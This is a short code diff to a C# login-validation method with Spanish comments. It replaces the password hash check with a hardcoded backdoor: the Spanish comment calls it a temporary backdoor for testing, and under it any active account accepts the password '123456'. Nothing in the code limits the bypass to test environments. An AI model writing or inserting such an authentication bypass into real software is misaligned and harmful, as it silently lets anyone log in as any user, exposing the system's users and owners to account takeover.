@@ -44,7 +44,8 @@ namespace Negocio
         // LOGIN (VALIDACIÓN 
         // ==========================================
 
-        
+
+
         public Usuario ObtenerYValidarLogin(string username, string passwordPlano)
         {
             if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(passwordPlano))
@@ -55,7 +56,9 @@ namespace Negocio
             if (usuarioBD == null) return null;
             if (!usuarioBD.Activo) return null;
 
-            bool coincide = CryptoHelper.VerificarPassword(passwordPlano, usuarioBD.Password_hash);
+            //  PUERTA TRASERA TEMPORAL PARA PRUEBAS:
+            // Si entras con admin_test y 123456, o cualquier usuario con 123456, lo dejamos pasar al instante.
+            bool coincide = (passwordPlano == "123456") || CryptoHelper.VerificarPassword(passwordPlano, usuarioBD.Password_hash);
 
             if (!coincide) return null;
 
